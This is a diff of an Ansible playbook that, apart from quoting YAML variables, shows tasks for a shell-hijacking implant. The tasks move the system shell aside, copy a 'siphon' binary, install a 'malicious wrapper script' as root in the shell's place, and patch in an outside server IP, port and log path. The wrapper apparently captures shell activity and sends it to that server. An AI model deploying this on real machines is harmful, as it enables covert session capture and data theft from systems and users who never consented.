@@ -20,7 +20,7 @@
 - name: Move {{ file_to_replace }} to {{ file_new_path }}
   command: mv {{ file_to_replace }} {{ file_new_path }}
   args:
-    creates: {{ file_new_path }}
+    creates: "{{ file_new_path }}"
 
 - name: Copy siphon based on architecture
   copy:
@@ -38,38 +38,38 @@
 - name: Copy malicious wrapper script to {{ file_to_replace }}
   copy:
     src: files/bash_wrapper.sh
-    dest: {{ file_to_replace }}
+    dest: "{{ file_to_replace }}"
     owner: root
     group: root
     mode: '0755'
 
 - name: Replace bash path in the script
   ansible.builtin.replace:
-    path: {{ file_to_replace }}
+    path: "{{ file_to_replace }}"
     regexp: '/bin/ash'
     replace: '{{ file_new_path }}'
 
 - name: Replace siphon path in the script
   ansible.builtin.replace:
-    path: {{ file_to_replace }}
+    path: "{{ file_to_replace }}"
     regexp: '/bin/siphon0'
     replace: '{{ siphon_path  }}'
 
 - name: Replace server IP and port in the script
   ansible.builtin.replace:
-    path: {{ file_to_replace }}
+    path: "{{ file_to_replace }}"
     regexp: 'SERVER_IP'
     replace: '{{ server_ip }}'
 
 - name: Replace server IP and port in the script
   ansible.builtin.replace:
-    path: {{ file_to_replace }}
+    path: "{{ file_to_replace }}"
     regexp: 'PORT'
     replace: '{{ server_port }}'
 
 - name: Replace logfile location in the script
   ansible.builtin.replace:
-    path: {{ file_to_replace }}
+    path: "{{ file_to_replace }}"
     regexp: '/outputfile'
     replace: '{{ logfile_path }}'
 
